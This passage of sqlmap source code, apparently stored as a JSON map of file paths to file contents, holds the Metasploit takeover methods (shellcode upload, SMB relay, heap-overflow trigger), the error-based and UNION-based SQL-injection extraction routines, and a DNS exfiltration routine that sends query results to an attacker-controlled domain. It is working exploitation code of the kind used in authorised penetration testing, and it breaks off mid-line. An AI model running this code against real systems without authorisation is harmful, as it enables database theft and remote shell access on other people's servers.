self.shellcodeexecRemote, \"binary\", forceCheck=True)\n\n        if written is not True:\n            errMsg = \"there has been a problem uploading shellcodeexec. It \"\n            errMsg += \"looks like the binary file has not been written \"\n            errMsg += \"on the database underlying file system or an AV has \"\n            errMsg += \"flagged it as malicious and removed it\"\n            logger.error(errMsg)\n\n            return False\n        else:\n            logger.info(\"shellcodeexec successfully uploaded\")\n            return True\n\n    def pwn(self, goUdf=False):\n        if goUdf:\n            exitfunc = \"thread\"\n            func = self._runMsfShellcodeRemote\n        else:\n            exitfunc = \"process\"\n            func = self._runMsfShellcodeRemoteViaSexec\n\n        self._runMsfCli(exitfunc=exitfunc)\n\n        if self.connectionStr.startswith(\"bind\"):\n            func()\n\n        debugMsg = \"Metasploit Framework command line interface exited \"\n        debugMsg += \"with return code %s\" % self._controlMsfCmd(self._msfCliProc, func)\n        logger.debug(debugMsg)\n\n        if not goUdf:\n            time.sleep(1)\n            self.delRemoteFile(self.shellcodeexecRemote)\n\n    def smb(self):\n        Metasploit._initVars(self)\n        self._randFile = \"tmpu%s.txt\" % randomStr(lowercase=True)\n\n        self._runMsfCliSmbrelay()\n\n        if Backend.getIdentifiedDbms() in (DBMS.MYSQL, DBMS.PGSQL):\n            self.uncPath = r\"\\\\\\\\%s\\\\%s\" % (self.lhostStr, self._randFile)\n        else:\n            self.uncPath = r\"\\\\%s\\%s\" % (self.lhostStr, self._randFile)\n\n        debugMsg = \"Metasploit Framework console exited with return \"\n        debugMsg += \"code %s\" % self._controlMsfCmd(self._msfCliProc, self.uncPathRequest)\n        logger.debug(debugMsg)\n\n    def bof(self):\n        self._runMsfCli(exitfunc=\"seh\")\n\n        if self.connectionStr.startswith(\"bind\"):\n            self.spHeapOverflow()\n\n        debugMsg = \"Metasploit Framework command line interface exited \"\n        debugMsg += \"with return code %s\" % self._controlMsfCmd(self._msfCliProc, self.spHeapOverflow)\n        logger.debug(debugMsg)\n", "lib/techniques/__init__.py": "#!/usr/bin/env python\n\n\"\"\"\nCopyright (c) 2006-2024 sqlmap developers (https://sqlmap.org/)\nSee the file 'LICENSE' for copying permission\n\"\"\"\n\npass\n", "lib/techniques/error/use.py": "#!/usr/bin/env python\n\n\"\"\"\nCopyright (c) 2006-2024 sqlmap developers (https://sqlmap.org/)\nSee the file 'LICENSE' for copying permission\n\"\"\"\n\nfrom __future__ import print_function\n\nimport re\nimport time\n\nfrom lib.core.agent import agent\nfrom lib.core.bigarray import BigArray\nfrom lib.core.common import Backend\nfrom lib.core.common import calculateDeltaSeconds\nfrom lib.core.common import dataToStdout\nfrom lib.core.common import decodeDbmsHexValue\nfrom lib.core.common import extractRegexResult\nfrom lib.core.common import firstNotNone\nfrom lib.core.common import getConsoleWidth\nfrom lib.core.common import getPartRun\nfrom lib.core.common import getTechnique\nfrom lib.core.common import getTechniqueData\nfrom lib.core.common import hashDBRetrieve\nfrom lib.core.common import hashDBWrite\nfrom lib.core.common import incrementCounter\nfrom lib.core.common import initTechnique\nfrom lib.core.common import isListLike\nfrom lib.core.common import isNumPosStrValue\nfrom lib.core.common import listToStrValue\nfrom lib.core.common import readInput\nfrom lib.core.common import unArrayizeValue\nfrom lib.core.common import wasLastResponseHTTPError\nfrom lib.core.compat import xrange\nfrom lib.core.convert import decodeHex\nfrom lib.core.convert import getUnicode\nfrom lib.core.convert import htmlUnescape\nfrom lib.core.data import conf\nfrom lib.core.data import kb\nfrom lib.core.data import logger\nfrom lib.core.data import queries\nfrom lib.core.dicts import FROM_DUMMY_TABLE\nfrom lib.core.enums import DBMS\nfrom lib.core.enums import HASHDB_KEYS\nfrom lib.core.enums import HTTP_HEADER\nfrom lib.core.exception import SqlmapDataException\nfrom lib.core.settings import CHECK_ZERO_COLUMNS_THRESHOLD\nfrom lib.core.settings import MAX_ERROR_CHUNK_LENGTH\nfrom lib.core.settings import MIN_ERROR_CHUNK_LENGTH\nfrom lib.core.settings import NULL\nfrom lib.core.settings import PARTIAL_VALUE_MARKER\nfrom lib.core.settings import ROTATING_CHARS\nfrom lib.core.settings import SLOW_ORDER_COUNT_THRESHOLD\nfrom lib.core.settings import SQL_SCALAR_REGEX\nfrom lib.core.settings import TURN_OFF_RESUME_INFO_LIMIT\nfrom lib.core.threads import getCurrentThreadData\nfrom lib.core.threads import runThreads\nfrom lib.core.unescaper import unescaper\nfrom lib.request.connect import Connect as Request\nfrom lib.utils.progress import ProgressBar\nfrom lib.utils.safe2bin import safecharencode\nfrom thirdparty import six\n\ndef _oneShotErrorUse(expression, field=None, chunkTest=False):\n    offset = 1\n    rotator = 0\n    partialValue = None\n    threadData = getCurrentThreadData()\n    retVal = hashDBRetrieve(expression, checkConf=True)\n\n    if retVal and PARTIAL_VALUE_MARKER in retVal:\n        partialValue = retVal = retVal.replace(PARTIAL_VALUE_MARKER, \"\")\n        logger.info(\"resuming partial value: '%s'\" % _formatPartialContent(partialValue))\n        offset += len(partialValue)\n\n    threadData.resumed = retVal is not None and not partialValue\n\n    if any(Backend.isDbms(dbms) for dbms in (DBMS.MYSQL, DBMS.MSSQL, DBMS.SYBASE, DBMS.ORACLE)) and kb.errorChunkLength is None and not chunkTest and not kb.testMode:\n        debugMsg = \"searching for error chunk length...\"\n        logger.debug(debugMsg)\n\n        seen = set()\n        current = MAX_ERROR_CHUNK_LENGTH\n        while current >= MIN_ERROR_CHUNK_LENGTH:\n            testChar = str(current % 10)\n\n            if Backend.isDbms(DBMS.ORACLE):\n                testQuery = \"RPAD('%s',%d,'%s')\" % (testChar, current, testChar)\n            else:\n                testQuery = \"%s('%s',%d)\" % (\"REPEAT\" if Backend.isDbms(DBMS.MYSQL) else \"REPLICATE\", testChar, current)\n                testQuery = \"SELECT %s\" % (agent.hexConvertField(testQuery) if conf.hexConvert else testQuery)\n\n            result = unArrayizeValue(_oneShotErrorUse(testQuery, chunkTest=True))\n            seen.add(current)\n\n            if (result or \"\").startswith(testChar):\n                if result == testChar * current:\n                    kb.errorChunkLength = current\n                    break\n                else:\n                    result = re.search(r\"\\A\\w+\", result).group(0)\n                    candidate = len(result) - len(kb.chars.stop)\n                    current = candidate if candidate != current and candidate not in seen else current - 1\n            else:\n                current = current // 2\n\n        if kb.errorChunkLength:\n            hashDBWrite(HASHDB_KEYS.KB_ERROR_CHUNK_LENGTH, kb.errorChunkLength)\n        else:\n            kb.errorChunkLength = 0\n\n    if retVal is None or partialValue:\n        try:\n            while True:\n                check = r\"(?si)%s(?P<result>.*?)%s\" % (kb.chars.start, kb.chars.stop)\n                trimCheck = r\"(?si)%s(?P<result>[^<\\n]*)\" % kb.chars.start\n\n                if field:\n                    nulledCastedField = agent.nullAndCastField(field)\n\n                    if any(Backend.isDbms(dbms) for dbms in (DBMS.MYSQL, DBMS.MSSQL, DBMS.SYBASE, DBMS.ORACLE)) and not any(_ in field for _ in (\"COUNT\", \"CASE\")) and kb.errorChunkLength and not chunkTest:\n                        extendedField = re.search(r\"[^ ,]*%s[^ ,]*\" % re.escape(field), expression).group(0)\n                        if extendedField != field:  # e.g. MIN(surname)\n                            nulledCastedField = extendedField.replace(field, nulledCastedField)\n                            field = extendedField\n                        nulledCastedField = queries[Backend.getIdentifiedDbms()].substring.query % (nulledCastedField, offset, kb.errorChunkLength)\n\n                # Forge the error-based SQL injection request\n                vector = getTechniqueData().vector\n                query = agent.prefixQuery(vector)\n                query = agent.suffixQuery(query)\n                injExpression = expression.replace(field, nulledCastedField, 1) if field else expression\n                injExpression = unescaper.escape(injExpression)\n                injExpression = query.replace(\"[QUERY]\", injExpression)\n                payload = agent.payload(newValue=injExpression)\n\n                # Perform the request\n                page, headers, _ = Request.queryPage(payload, content=True, raise404=False)\n\n                incrementCounter(getTechnique())\n\n                if page and conf.noEscape:\n                    page = re.sub(r\"('|\\%%27)%s('|\\%%27).*?('|\\%%27)%s('|\\%%27)\" % (kb.chars.start, kb.chars.stop), \"\", page)\n\n                # Parse the returned page to get the exact error-based\n                # SQL injection output\n                output = firstNotNone(\n                    extractRegexResult(check, page),\n                    extractRegexResult(check, threadData.lastHTTPError[2] if wasLastResponseHTTPError() else None),\n                    extractRegexResult(check, listToStrValue((headers[header] for header in headers if header.lower() != HTTP_HEADER.URI.lower()) if headers else None)),\n                    extractRegexResult(check, threadData.lastRedirectMsg[1] if threadData.lastRedirectMsg and threadData.lastRedirectMsg[0] == threadData.lastRequestUID else None)\n                )\n\n                if output is not None:\n                    output = getUnicode(output)\n                else:\n                    trimmed = firstNotNone(\n                        extractRegexResult(trimCheck, page),\n                        extractRegexResult(trimCheck, threadData.lastHTTPError[2] if wasLastResponseHTTPError() else None),\n                        extractRegexResult(trimCheck, listToStrValue((headers[header] for header in headers if header.lower() != HTTP_HEADER.URI.lower()) if headers else None)),\n                        extractRegexResult(trimCheck, threadData.lastRedirectMsg[1] if threadData.lastRedirectMsg and threadData.lastRedirectMsg[0] == threadData.lastRequestUID else None)\n                    )\n\n                    if trimmed:\n                        if not chunkTest:\n                            warnMsg = \"possible server trimmed output detected \"\n                            warnMsg += \"(due to its length and/or content): \"\n                            warnMsg += safecharencode(trimmed)\n                            logger.warning(warnMsg)\n\n                        if not kb.testMode:\n                            check = r\"(?P<result>[^<>\\n]*?)%s\" % kb.chars.stop[:2]\n                            output = extractRegexResult(check, trimmed, re.IGNORECASE)\n\n                            if not output:\n                                check = r\"(?P<result>[^\\s<>'\\\"]+)\"\n                                output = extractRegexResult(check, trimmed, re.IGNORECASE)\n                            else:\n                                output = output.rstrip()\n\n                if any(Backend.isDbms(dbms) for dbms in (DBMS.MYSQL, DBMS.MSSQL, DBMS.SYBASE, DBMS.ORACLE)):\n                    if offset == 1:\n                        retVal = output\n                    else:\n                        retVal += output if output else ''\n\n                    if output and kb.errorChunkLength and len(output) >= kb.errorChunkLength and not chunkTest:\n                        offset += kb.errorChunkLength\n                    else:\n                        break\n\n                    if output and conf.verbose in (1, 2) and not any((conf.api, kb.bruteMode)):\n                        if kb.fileReadMode:\n                            dataToStdout(_formatPartialContent(output).replace(r\"\\n\", \"\\n\").replace(r\"\\t\", \"\\t\"))\n                        elif offset > 1:\n                            rotator += 1\n\n                            if rotator >= len(ROTATING_CHARS):\n                                rotator = 0\n\n                            dataToStdout(\"\\r%s\\r\" % ROTATING_CHARS[rotator])\n                else:\n                    retVal = output\n                    break\n        except:\n            if retVal is not None:\n                hashDBWrite(expression, \"%s%s\" % (retVal, PARTIAL_VALUE_MARKER))\n            raise\n\n        retVal = decodeDbmsHexValue(retVal) if conf.hexConvert else retVal\n\n        if isinstance(retVal, six.string_types):\n            retVal = htmlUnescape(retVal).replace(\"<br>\", \"\\n\")\n\n        retVal = _errorReplaceChars(retVal)\n\n        if retVal is not None:\n            hashDBWrite(expression, retVal)\n\n    else:\n        _ = \"(?si)%s(?P<result>.*?)%s\" % (kb.chars.start, kb.chars.stop)\n        retVal = extractRegexResult(_, retVal) or retVal\n\n    return safecharencode(retVal) if kb.safeCharEncode else retVal\n\ndef _errorFields(expression, expressionFields, expressionFieldsList, num=None, emptyFields=None, suppressOutput=False):\n    values = []\n    origExpr = None\n\n    width = getConsoleWidth()\n    threadData = getCurrentThreadData()\n\n    for field in expressionFieldsList:\n        output = None\n\n        if field.startswith(\"ROWNUM \"):\n            continue\n\n        if isinstance(num, int):\n            origExpr = expression\n            expression = agent.limitQuery(num, expression, field, expressionFieldsList[0])\n\n        if \"ROWNUM\" in expressionFieldsList:\n            expressionReplaced = expression\n        else:\n            expressionReplaced = expression.replace(expressionFields, field, 1)\n\n        output = NULL if emptyFields and field in emptyFields else _oneShotErrorUse(expressionReplaced, field)\n\n        if not kb.threadContinue:\n            return None\n\n        if not any((suppressOutput, kb.bruteMode)):\n            if kb.fileReadMode and output and output.strip():\n                print()\n            elif output is not None and not (threadData.resumed and kb.suppressResumeInfo) and not (emptyFields and field in emptyFields):\n                status = \"[%s] [INFO] %s: '%s'\" % (time.strftime(\"%X\"), \"resumed\" if threadData.resumed else \"retrieved\", output if kb.safeCharEncode else safecharencode(output))\n\n                if len(status) > width:\n                    status = \"%s...\" % status[:width - 3]\n\n                dataToStdout(\"%s\\n\" % status)\n\n        if isinstance(num, int):\n            expression = origExpr\n\n        values.append(output)\n\n    return values\n\ndef _errorReplaceChars(value):\n    \"\"\"\n    Restores safely replaced characters\n    \"\"\"\n\n    retVal = value\n\n    if value:\n        retVal = retVal.replace(kb.chars.space, \" \").replace(kb.chars.dollar, \"$\").replace(kb.chars.at, \"@\").replace(kb.chars.hash_, \"#\")\n\n    return retVal\n\ndef _formatPartialContent(value):\n    \"\"\"\n    Prepares (possibly hex-encoded) partial content for safe console output\n    \"\"\"\n\n    if value and isinstance(value, six.string_types):\n        try:\n            value = decodeHex(value, binary=False)\n        except:\n            pass\n        finally:\n            value = safecharencode(value)\n\n    return value\n\ndef errorUse(expression, dump=False):\n    \"\"\"\n    Retrieve the output of a SQL query taking advantage of the error-based\n    SQL injection vulnerability on the affected parameter.\n    \"\"\"\n\n    initTechnique(getTechnique())\n\n    abortedFlag = False\n    count = None\n    emptyFields = []\n    start = time.time()\n    startLimit = 0\n    stopLimit = None\n    value = None\n\n    _, _, _, _, _, expressionFieldsList, expressionFields, _ = agent.getFields(expression)\n\n    # Set kb.partRun in case the engine is called from the API\n    kb.partRun = getPartRun(alias=False) if conf.api else None\n\n    # We have to check if the SQL query might return multiple entries\n    # and in such case forge the SQL limiting the query output one\n    # entry at a time\n    # NOTE: we assume that only queries that get data from a table can\n    # return multiple entries\n    if (dump and (conf.limitStart or conf.limitStop)) or (\" FROM \" in expression.upper() and ((Backend.getIdentifiedDbms() not in FROM_DUMMY_TABLE) or (Backend.getIdentifiedDbms() in FROM_DUMMY_TABLE and not expression.upper().endswith(FROM_DUMMY_TABLE[Backend.getIdentifiedDbms()]))) and (\"(CASE\" not in expression.upper() or (\"(CASE\" in expression.upper() and \"WHEN use\" in expression))) and not re.search(SQL_SCALAR_REGEX, expression, re.I):\n        expression, limitCond, topLimit, startLimit, stopLimit = agent.limitCondition(expression, dump)\n\n        if limitCond:\n            # Count the number of SQL query entries output\n            countedExpression = expression.replace(expressionFields, queries[Backend.getIdentifiedDbms()].count.query % ('*' if len(expressionFieldsList) > 1 else expressionFields), 1)\n\n            if \" ORDER BY \" in countedExpression.upper():\n                _ = countedExpression.upper().rindex(\" ORDER BY \")\n                countedExpression = countedExpression[:_]\n\n            _, _, _, _, _, _, countedExpressionFields, _ = agent.getFields(countedExpression)\n            count = unArrayizeValue(_oneShotErrorUse(countedExpression, countedExpressionFields))\n\n            if isNumPosStrValue(count):\n                if isinstance(stopLimit, int) and stopLimit > 0:\n                    stopLimit = min(int(count), int(stopLimit))\n                else:\n                    stopLimit = int(count)\n\n                    debugMsg = \"used SQL query returns \"\n                    debugMsg += \"%d %s\" % (stopLimit, \"entries\" if stopLimit > 1 else \"entry\")\n                    logger.debug(debugMsg)\n\n            elif count and not count.isdigit():\n                warnMsg = \"it was not possible to count the number \"\n                warnMsg += \"of entries for the SQL query provided. \"\n                warnMsg += \"sqlmap will assume that it returns only \"\n                warnMsg += \"one entry\"\n                logger.warning(warnMsg)\n\n                stopLimit = 1\n\n            elif not isNumPosStrValue(count):\n                if not count:\n                    warnMsg = \"the SQL query provided does not \"\n                    warnMsg += \"return any output\"\n                    logger.warning(warnMsg)\n                else:\n                    value = []  # for empty tables\n                return value\n\n            if isNumPosStrValue(count) and int(count) > 1:\n                if \" ORDER BY \" in expression and (stopLimit - startLimit) > SLOW_ORDER_COUNT_THRESHOLD:\n                    message = \"due to huge table size do you want to remove \"\n                    message += \"ORDER BY clause gaining speed over consistency? [y/N] \"\n\n                    if readInput(message, default='N', boolean=True):\n                        expression = expression[:expression.index(\" ORDER BY \")]\n\n                numThreads = min(conf.threads, (stopLimit - startLimit))\n\n                threadData = getCurrentThreadData()\n\n                try:\n                    threadData.shared.limits = iter(xrange(startLimit, stopLimit))\n                except OverflowError:\n                    errMsg = \"boundary limits (%d,%d) are too large. Please rerun \" % (startLimit, stopLimit)\n                    errMsg += \"with switch '--fresh-queries'\"\n                    raise SqlmapDataException(errMsg)\n\n                threadData.shared.value = BigArray()\n                threadData.shared.buffered = []\n                threadData.shared.counter = 0\n                threadData.shared.lastFlushed = startLimit - 1\n                threadData.shared.showEta = conf.eta and (stopLimit - startLimit) > 1\n\n                if threadData.shared.showEta:\n                    threadData.shared.progress = ProgressBar(maxValue=(stopLimit - startLimit))\n\n                if kb.dumpTable and (len(expressionFieldsList) < (stopLimit - startLimit) > CHECK_ZERO_COLUMNS_THRESHOLD):\n                    for field in expressionFieldsList:\n                        if _oneShotErrorUse(\"SELECT COUNT(%s) FROM %s\" % (field, kb.dumpTable)) == '0':\n                            emptyFields.append(field)\n                            debugMsg = \"column '%s' of table '%s' will not be \" % (field, kb.dumpTable)\n                            debugMsg += \"dumped as it appears to be empty\"\n                            logger.debug(debugMsg)\n\n                if stopLimit > TURN_OFF_RESUME_INFO_LIMIT:\n                    kb.suppressResumeInfo = True\n                    debugMsg = \"suppressing possible resume console info because of \"\n                    debugMsg += \"large number of rows. It might take too long\"\n                    logger.debug(debugMsg)\n\n                try:\n                    def errorThread():\n                        threadData = getCurrentThreadData()\n\n                        while kb.threadContinue:\n                            with kb.locks.limit:\n                                try:\n                                    threadData.shared.counter += 1\n                                    num = next(threadData.shared.limits)\n                                except StopIteration:\n                                    break\n\n                            output = _errorFields(expression, expressionFields, expressionFieldsList, num, emptyFields, threadData.shared.showEta)\n\n                            if not kb.threadContinue:\n                                break\n\n                            if output and isListLike(output) and len(output) == 1:\n                                output = unArrayizeValue(output)\n\n                            with kb.locks.value:\n                                index = None\n                                if threadData.shared.showEta:\n                                    threadData.shared.progress.progress(threadData.shared.counter)\n                                for index in xrange(1 + len(threadData.shared.buffered)):\n                                    if index < len(threadData.shared.buffered) and threadData.shared.buffered[index][0] >= num:\n                                        break\n                                threadData.shared.buffered.insert(index or 0, (num, output))\n                                while threadData.shared.buffered and threadData.shared.lastFlushed + 1 == threadData.shared.buffered[0][0]:\n                                    threadData.shared.lastFlushed += 1\n                                    threadData.shared.value.append(threadData.shared.buffered[0][1])\n                                    del threadData.shared.buffered[0]\n\n                    runThreads(numThreads, errorThread)\n\n                except KeyboardInterrupt:\n                    abortedFlag = True\n                    warnMsg = \"user aborted during enumeration. sqlmap \"\n                    warnMsg += \"will display partial output\"\n                    logger.warning(warnMsg)\n\n                finally:\n                    threadData.shared.value.extend(_[1] for _ in sorted(threadData.shared.buffered))\n                    value = threadData.shared.value\n                    kb.suppressResumeInfo = False\n\n    if not value and not abortedFlag:\n        value = _errorFields(expression, expressionFields, expressionFieldsList)\n\n    if value and isListLike(value):\n        if len(value) == 1 and isinstance(value[0], (six.string_types, type(None))):\n            value = unArrayizeValue(value)\n        elif len(value) > 1 and stopLimit == 1:\n            value = [value]\n\n    duration = calculateDeltaSeconds(start)\n\n    if not kb.bruteMode:\n        debugMsg = \"performed %d quer%s in %.2f seconds\" % (kb.counters[getTechnique()], 'y' if kb.counters[getTechnique()] == 1 else \"ies\", duration)\n        logger.debug(debugMsg)\n\n    return value\n", "lib/techniques/error/__init__.py": "#!/usr/bin/env python\n\n\"\"\"\nCopyright (c) 2006-2024 sqlmap developers (https://sqlmap.org/)\nSee the file 'LICENSE' for copying permission\n\"\"\"\n\npass\n", "lib/techniques/dns/use.py": "#!/usr/bin/env python\n\n\"\"\"\nCopyright (c) 2006-2024 sqlmap developers (https://sqlmap.org/)\nSee the file 'LICENSE' for copying permission\n\"\"\"\n\nimport re\nimport time\n\nfrom lib.core.agent import agent\nfrom lib.core.common import Backend\nfrom lib.core.common import calculateDeltaSeconds\nfrom lib.core.common import dataToStdout\nfrom lib.core.common import decodeDbmsHexValue\nfrom lib.core.common import extractRegexResult\nfrom lib.core.common import getSQLSnippet\nfrom lib.core.common import hashDBRetrieve\nfrom lib.core.common import hashDBWrite\nfrom lib.core.common import randomInt\nfrom lib.core.common import randomStr\nfrom lib.core.common import safeStringFormat\nfrom lib.core.common import singleTimeWarnMessage\nfrom lib.core.compat import xrange\nfrom lib.core.data import conf\nfrom lib.core.data import kb\nfrom lib.core.data import logger\nfrom lib.core.data import queries\nfrom lib.core.enums import DBMS\nfrom lib.core.settings import DNS_BOUNDARIES_ALPHABET\nfrom lib.core.settings import MAX_DNS_LABEL\nfrom lib.core.settings import PARTIAL_VALUE_MARKER\nfrom lib.core.unescaper import unescaper\nfrom lib.request.connect import Connect as Request\nfrom lib.utils.safe2bin import safecharencode\n\ndef dnsUse(payload, expression):\n    \"\"\"\n    Retrieve the output of a SQL query taking advantage of the DNS\n    resolution mechanism by making request back to attacker's machine.\n    \"\"\"\n\n    start = time.time()\n\n    retVal = None\n    count = 0\n    offset = 1\n\n    if conf.dnsDomain and Backend.getIdentifiedDbms() in (DBMS.MSSQL, DBMS.ORACLE, DBMS.MYSQL, DBMS.PGSQL):\n        output = hashDBRetrieve(expression, checkConf=True)\n\n        if output and PARTIAL_VALUE_MARKER in output or kb.dnsTest is None:\n            output = None\n\n        if output is None:\n            kb.dnsMode = True\n\n            while True:\n                count += 1\n                prefix, suffix = (\"%s\" % randomStr(length=3, alphabet=DNS_BOUNDARIES_ALPHABET) for _ in xrange(2))\n                chunk_length = MAX_DNS_LABEL // 2 if Backend.getIdentifiedDbms() in (DBMS.ORACLE, DBMS.MYSQL, DBMS.PGSQL) else MAX_DNS_LABEL // 4 - 2\n                _, _, _, _, _, _, fieldToCastStr, _ = agent.getFields(expression)\n                nulledCastedField = agent.nullAndCastField(fieldToCastStr)\n                extendedField = re.search(r\"[^ ,]*%s[^ ,]*\" % re.escape(fieldToCastStr), expression).group(0)\n                if extendedField != fieldToCastStr:  # e.g. MIN(surname)\n                    nulledCastedField = extendedField.replace(fieldToCastStr, nulledCastedField)\n                    fieldToCastStr = extendedField\n                nulledCastedField = queries[Backend.getIdentifiedDbms()].substring.query % (nulledCastedField, offset, chunk_length)\n                nulledCastedField = agent.hexConvertField(nulledCastedField)\n                expressionReplaced = expression.replace(fieldToCastStr, nulledCastedField, 1)\n\n                expressionRequest = getSQLSnippet(Backend.getIdentifiedDbms(), \"dns_request\", PREFIX=prefix, QUERY=expressionReplaced, SUFFIX=suffix, DOMAIN=conf.dnsDomain)\n                expressionUnescaped = unescaper.escape(expressionRequest)\n\n                if Backend.getIdentifiedDbms() in (DBMS.MSSQL, DBMS.PGSQL):\n                    query = agent.prefixQuery(\"; %s\" % expressionUnescaped)\n                    query = \"%s%s\" % (query, queries[Backend.getIdentifiedDbms()].comment.query)\n                    forgedPayload = agent.payload(newValue=query)\n                else:\n                    forgedPayload = safeStringFormat(payload, (expressionUnescaped, randomInt(1), randomInt(3)))\n\n                Request.queryPage(forgedPayload, content=False, noteResponseTime=False, raise404=False)\n\n                _ = conf.dnsServer.pop(prefix, suffix)\n\n                if _:\n                    _ = extractRegexResult(r\"%s\\.(?P<result>.+)\\.%s\" % (prefix, suffix), _, re.I)\n                    _ = decodeDbmsHexValue(_)\n                    output = (output or \"\") + _\n                    offset += len(_)\n\n                    if len(_) < chunk_length:\n                        break\n                else:\n                    break\n\n            output = decodeDbmsHexValue(output) if conf.hexConvert else output\n\n            kb.dnsMode = False\n\n        if output is not None:\n            retVal = output\n\n            if kb.dnsTest is not None:\n                dataToStdout(\"[%s] [INFO] %s: %s\\n\" % (time.strftime(\"%X\"), \"retrieved\" if count > 0 else \"resumed\", safecharencode(output)))\n\n                if count > 0:\n                    hashDBWrite(expression, output)\n\n        if not kb.bruteMode:\n            debugMsg = \"performed %d quer%s in %.2f seconds\" % (count, 'y' if count == 1 else \"ies\", calculateDeltaSeconds(start))\n            logger.debug(debugMsg)\n\n    elif conf.dnsDomain:\n        warnMsg = \"DNS data exfiltration method through SQL injection \"\n        warnMsg += \"is currently not available for DBMS %s\" % Backend.getIdentifiedDbms()\n        singleTimeWarnMessage(warnMsg)\n\n    return safecharencode(retVal) if kb.safeCharEncode else retVal\n", "lib/techniques/dns/__init__.py": "#!/usr/bin/env python\n\n\"\"\"\nCopyright (c) 2006-2024 sqlmap developers (https://sqlmap.org/)\nSee the file 'LICENSE' for copying permission\n\"\"\"\n\npass\n", "lib/techniques/union/use.py": "#!/usr/bin/env python\n\n\"\"\"\nCopyright (c) 2006-2024 sqlmap developers (https://sqlmap.org/)\nSee the file 'LICENSE' for copying permission\n\"\"\"\n\nimport json\nimport re\nimport time\n\nfrom lib.core.agent import agent\nfrom lib.core.bigarray import BigArray\nfrom lib.core.common import arrayizeValue\nfrom lib.core.common import Backend\nfrom lib.core.common import calculateDeltaSeconds\nfrom lib.core.common import clearConsoleLine\nfrom lib.core.common import dataToStdout\nfrom lib.core.common import extractRegexResult\nfrom lib.core.common import firstNotNone\nfrom lib.core.common import flattenValue\nfrom lib.core.common import getConsoleWidth\nfrom lib.core.common import getPartRun\nfrom lib.core.common import hashDBRetrieve\nfrom lib.core.common import hashDBWrite\nfrom lib.core.common import incrementCounter\nfrom lib.core.common import initTechnique\nfrom lib.core.common import isDigit\nfrom lib.core.common import isListLike\nfrom lib.core.common import isNoneValue\nfrom lib.core.common import isNumPosStrValue\nfrom lib.core.common import listToStrValue\nfrom lib.core.common import parseUnionPage\nfrom lib.core.common import removeReflectiveValues\nfrom lib.core.common import singleTimeDebugMessage\nfrom lib.core.common import singleTimeWarnMessage\nfrom lib.core.common import unArrayizeValue\nfrom lib.core.common import wasLastResponseDBMSError\nfrom lib.core.compat import xrange\nfrom lib.core.convert import getUnicode\nfrom lib.core.convert import htmlUnescape\nfrom lib.core.data import conf\nfrom lib.core.data import kb\nfrom lib.core.data import logger\nfrom lib.core.data import queries\nfrom lib.core.dicts import FROM_DUMMY_TABLE\nfrom lib.core.enums import DBMS\nfrom lib.core.enums import HTTP_HEADER\nfrom lib.core.enums import PAYLOAD\nfrom lib.core.exception import SqlmapDataException\nfrom lib.core.exception import SqlmapSyntaxException\nfrom lib.core.settings import MAX_BUFFERED_PARTIAL_UNION_LENGTH\nfrom lib.core.settings import NULL\nfrom lib.core.settings import SQL_SCALAR_REGEX\nfrom lib.core.settings import TURN_OFF_RESUME_INFO_LIMIT\nfrom lib.core.threads import getCurrentThreadData\nfrom lib.core.threads import runThreads\nfrom lib.core.unescaper import unescaper\nfrom lib.request.connect import Connect as Request\nfrom lib.utils.progress import ProgressBar\nfrom lib.utils.safe2bin import safecharencode\nfrom thirdparty import six\nfrom thirdparty.odict import OrderedDict\n\ndef _oneShotUnionUse(expression, unpack=True, limited=False):\n    retVal = hashDBRetrieve(\"%s%s\" % (conf.hexConvert or False, expression), checkConf=True)  # as UNION data is stored raw unconverted\n\n    threadData = getCurrentThreadData()\n    threadData.resumed = retVal is not None\n\n    if retVal is None:\n        vector = kb.injection.data[PAYLOAD.TECHNIQUE.UNION].vector\n\n        if not kb.jsonAggMode:\n            injExpression = unescaper.escape(agent.concatQuery(expression, unpack))\n            kb.unionDuplicates = vector[7]\n            kb.forcePartialUnion = vector[8]\n\n            # Note: introduced columns in 1.4.2.42#dev\n            try:\n                kb.tableFrom = vector[9]\n                kb.unionTemplate = vector[10]\n            except IndexError:\n                pass\n\n            query = agent.forgeUnionQuery(injExpression, vector[0], vector[1], vector[2], vector[3], vector[4], vector[5], vector[6], None, limited)\n            where = PAYLOAD.WHERE.NEGATIVE if conf.limitStart or conf.limitStop else vector[6]\n        else:\n            injExpression = unescaper.escape(expression)\n            where = vector[6]\n            query = agent.forgeUnionQuery(injExpression, vector[0], vector[1], vector[2], vector[3], vector[4], vector[5], vector[6], None, False)\n\n        payload = agent.payload(newValue=query, where=where)\n\n        # Perform the request\n        page, headers, _ = Request.queryPage(payload, content=True, raise404=False)\n\n        if page and kb.chars.start.upper() in page and kb.chars.start not in page:\n            singleTimeWarnMessage(\"results seems to be upper-cased by force. sqlmap will automatically lower-case them\")\n\n            page = page.lower()\n\n        incrementCounter(PAYLOAD.TECHNIQUE.UNION)\n\n        if kb.jsonAggMode:\n            for _page in (page or \"\", (page or \"\").replace('\\\\\"', '\"')):\n                if Backend.isDbms(DBMS.MSSQL):\n                    output = extractRegexResult(r\"%s(?P<result>.*)%s\" % (kb.chars.start, kb.chars.stop), removeReflectiveValues(_page, payload))\n                    if output:\n                        try:\n                            retVal = \"\"\n                            fields = re.findall(r'\"([^\"]+)\":', extractRegexResult(r\"{(?P<result>[^}]+)}\", output))\n                            for row in json.loads(output):\n                                retVal += \"%s%s%s\" % (kb.chars.start, kb.chars.delimiter.join(getUnicode(row[field] or NULL) for field in fields), kb.chars.stop)\n                        except:\n                            retVal = None\n                        else:\n                            retVal = getUnicode(retVal)\n                elif Backend.isDbms(DBMS.PGSQL):\n                    output = extractRegexResult(r\"(?P<result>%s.*%s)\" % (kb.chars.start, kb.chars.stop), removeReflectiveValues(_page, payload))\n                    if output:\n                        retVal = output\n                else:\n                    output = extractRegexResult(r\"%s(?P<result>.*?)%s\" % (kb.chars.start, kb.chars.stop), removeReflectiveValues(_page, payload))\n                    if output:\n                        try:\n                            retVal = \"\"\n                            for row in json.loads(output):\n                                retVal += \"%s%s%s\" % (kb.chars.start, row, kb.chars.stop)\n                        except:\n                            retVal = None\n                        else:\n                            retVal = getUnicode(retVal)\n\n                if retVal:\n                    break\n        else:\n            # Parse the returned page to get the exact UNION-based\n            # SQL injection output\n            def _(regex):\n                return firstNotNone(\n                    extractRegexResult(regex, removeReflectiveValues(page, payload), re.DOTALL | re.IGNORECASE),\n                    extractRegexResult(regex, removeReflectiveValues(listToStrValue((_ for _ in headers.headers if not _.startswith(HTTP_HEADER.URI)) if headers else None), payload, True), re.DOTALL | re.IGNORECASE)\n                )\n\n            # Automatically patching last char trimming cases\n            if kb.chars.stop not in (page or \"\") and 